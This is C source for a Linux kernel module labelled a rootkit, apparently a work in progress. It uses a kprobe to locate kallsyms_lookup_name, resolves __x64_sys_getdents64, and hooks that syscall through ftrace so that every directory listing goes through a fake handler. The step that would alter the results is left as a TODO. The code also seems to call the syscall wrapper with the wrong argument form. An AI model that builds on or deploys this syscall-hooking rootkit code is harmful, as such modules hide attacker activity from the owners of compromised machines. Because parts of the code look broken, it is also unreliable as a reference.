#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>

// Forward declare functions
static void hook_getdents64(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs);
static asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

// Function pointer for the real getdents64 call
static asmlinkage long (*real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

// Function pointer for our symbol searching function
static unsigned long (*kallsyms_lookup_name_fn)(const char *name);

static struct ftrace_ops ops = {
    .func = hook_getdents64,
    .flags = FTRACE_OPS_FL_SAVE_REGS |
             FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

static void hook_getdents64(unsigned long ip,
                            unsigned long parent_ip,
                            struct ftrace_ops *ops,
                            struct ftrace_regs *fregs
                        )
{
    pr_info("[rootkit] - called hook_getdents64\n");

    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!regs)
        return;

    // Catch the case that we're hooking our own call to stop infinite recursion
    if (parent_ip == (unsigned long)fake_getdents64)
        return;

    // Skip the actual syscall by updating instruction pointer
    regs->ip = (unsigned long)fake_getdents64;
}

static asmlinkage long fake_getdents64(unsigned int fd, 
                                    struct linux_dirent64 __user *dirent,
                                    unsigned int count)
{
    pr_info("[rootkit] - called fake_getdents64\n");
    long ret;

    // 2. Call real_getdents64
    ret = real_getdents64(fd, dirent, count);

    // 3. Modify results
    // TODO

    return ret;
}

int init_rootkit(void)
{
    pr_info("[rootkit] - Hello\n");

    // Register a kprobe to find our symbol searching function
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    register_kprobe(&kp);
    kallsyms_lookup_name_fn = (void *)kp.addr;
    unregister_kprobe(&kp);

    // Use our symbol search function to find __x64_sys_getdents64
    unsigned long target = kallsyms_lookup_name_fn("__x64_sys_getdents64");
    if (!target) {
        pr_info("[rootkit] __x64_sys_getdents64 lookup failed\n");
        return -EFAULT;
    }
    real_getdents64 = (void*)target;

    pr_info("[rootkit] kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);
    pr_info("[rootkit] __x64_sys_getdents64 = %px\n", real_getdents64);

    // Register a hook
    ftrace_set_filter(&ops, "__x64_sys_getdents64", 0, 0);
    register_ftrace_function(&ops);
    
    return 0;
}

void exit_rootkit(void)
{
    // Unregister hook
    unregister_ftrace_function(&ops);
    ftrace_set_filter(&ops, NULL, 0, 1);

    pr_info("[rootkit] - Bye\n");
}

module_init(init_rootkit);
module_exit(exit_rootkit);
MODULE_LICENSE("GPL");
